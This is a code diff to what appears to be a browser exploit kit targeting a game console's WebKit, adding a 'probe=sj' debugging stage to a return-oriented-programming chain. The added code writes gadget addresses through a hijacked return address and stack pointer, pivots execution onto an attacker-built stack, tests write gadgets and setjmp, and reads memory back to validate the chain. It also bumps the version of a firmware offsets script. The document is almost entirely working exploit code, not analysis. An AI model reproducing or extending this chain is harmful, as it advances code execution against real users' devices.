@@ -222,7 +222,14 @@ async function prepare(p) {
         const triedPivotProbe = parts.some(x => x.indexOf("probe-pivot") === 0);
         const pivotWasSilent = parts.indexOf("probe-pivot-SILENT") !== -1;
         const triedRspProbe = parts.some(x => x.indexOf("probe-rsp") === 0);
-        if (!PROBE && pivotWasSilent && !triedRspProbe) {
+        const rspWasSilent = parts.indexOf("probe-rsp-SILENT") !== -1;
+        const triedSjProbe = parts.some(x => x.indexOf("probe-sj") === 0);
+        if (!PROBE && rspWasSilent && !triedSjProbe) {
+            PROBE = "sj";
+            jbmark("PROBE-AUTO", "pop rsp and the stack switch both work, so the"
+                + " fault is the write gadgets or setjmp/longjmp -- escalating to"
+                + " probe=sj, which runs both and reads the results back");
+        } else if (!PROBE && pivotWasSilent && !triedRspProbe) {
             PROBE = "rsp";
             jbmark("PROBE-AUTO", "the hijacked return address executes cleanly"
                 + " (infloop parked the worker, no crash) -- escalating to"
@@ -770,6 +777,71 @@ async function prepare(p) {
                 + "-poprsp=0x" + gadgets["pop rsp"].toString()
                 + "-rsp=0x" + chain.stack_entry_point.toString());
 
+        if (PROBE === "sj") {
+            /* Everything up to and including the stack switch is proven, and a
+               parked worker lets us read memory back afterwards -- so run the
+               remaining pieces for real and INSPECT the result instead of
+               inferring it from a crash.
+
+               chain: write MAGIC through the same gadgets the restore-writes
+               use, call setjmp on a buffer we own, then park in infloop.
+               Afterwards scratch tells us whether pop rdi / pop rsi /
+               mov [rdi],rsi work, and the jmp_buf dump tells us whether
+               OFFSET_lc_setjmp is really setjmp and whether the profile's
+               "+0x00 rip, +0x10 rsp" layout claim actually holds -- which is
+               exactly what longjmp depends on. */
+            const sjbuf = malloc(0x100);
+            const scratch = malloc(0x40);
+            const stk = malloc(0x200);
+            const MAGIC = new int64(0x13371337, 0x0BADF00D);
+            for (let z = 0; z < 0x100; z += 8) p.write8(sjbuf.add32(z), new int64(0, 0));
+            p.write8(scratch, new int64(0, 0));
+
+            let i = 0;
+            const put = (v) => { p.write8(stk.add32(i * 8), v); i++; };
+            // SysV: the slot holding a called address must be 16-byte aligned,
+            // so that rsp % 16 == 8 on entry. Same rule rop.js's fcall applies.
+            const align = () => { if ((stk.low + i * 8) & 8) put(gadgets["ret"]); };
+            put(gadgets["pop rdi"]); put(scratch);
+            put(gadgets["pop rsi"]); put(MAGIC);
+            put(gadgets["mov [rdi], rsi"]);
+            put(gadgets["pop rdi"]); put(sjbuf);
+            align();
+            put(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
+            put(gadgets["infloop"]);
+
+            crumb("probe-sj-w1");
+            p.write8(return_address_ptr, gadgets["pop rsp"]);
+            p.write8(stack_pointer_ptr, stk);
+            crumb("probe-sj-armed");
+            const ans = await new Promise((resolve) => {
+                const t = setTimeout(() => resolve(false), 6000);
+                worker.onmessage = function () { clearTimeout(t); resolve(true); };
+                crumb("probe-sj-pm");
+                worker.postMessage(0);
+            });
+            const got = p.read8(scratch);
+            const wroteOK = got.low === MAGIC.low && got.hi === MAGIC.hi;
+            const dump = [];
+            for (let z = 0; z < 0x40; z += 8)
+                dump.push("+0x" + z.toString(16) + "=0x" + p.read8(sjbuf.add32(z)).toString());
+            crumb("probe-sj-" + (ans ? "ANSWERED" : "SILENT") + (wroteOK ? "-wOK" : "-wBAD"));
+            jbmark("PROBE-SJ", "write=" + (wroteOK ? "ok" : "FAILED")
+                + "-answered=" + ans + "-jmpbuf=" + dump.join(" "));
+            throw new Error("probe=sj: worker " + (ans ? "ANSWERED" : "went SILENT")
+                + ". write gadgets (pop rdi/pop rsi/mov [rdi],rsi): "
+                + (wroteOK ? "WORK (scratch holds MAGIC)"
+                    : "FAILED -- scratch = 0x" + got.toString()
+                    + ", so one of those three gadgets is wrong")
+                + ". jmp_buf after setjmp(libc+0x"
+                + OFFSET_lc_setjmp.toString(16) + "): " + dump.join("  ")
+                + "  -- [+0x00] must be a libSceNKWebKit code address (the chain"
+                + " slot after setjmp) and [+0x10] must be a stack address near"
+                + " 0x" + stk.toString() + " for the profile's layout claim to"
+                + " hold. All zero means setjmp never ran. Worker is spinning;"
+                + " reload.");
+        }
+
         if (PROBE === "rsp") {
             /* One step past probe=pivot: use the REAL pivot gadget and switch
                to a stack we control, whose only entry is `jmp $`. That covers
@@ -929,4 +1001,4 @@ let fwScript = document.createElement('script');
 document.body.appendChild(fwScript);
 
 window.__offsetsScript = fwScript;
-fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=26`);
+fwScript.setAttribute('src', `${SLOPKIT_ROOT}offsets/${window.fw_str}.js?v=27`);
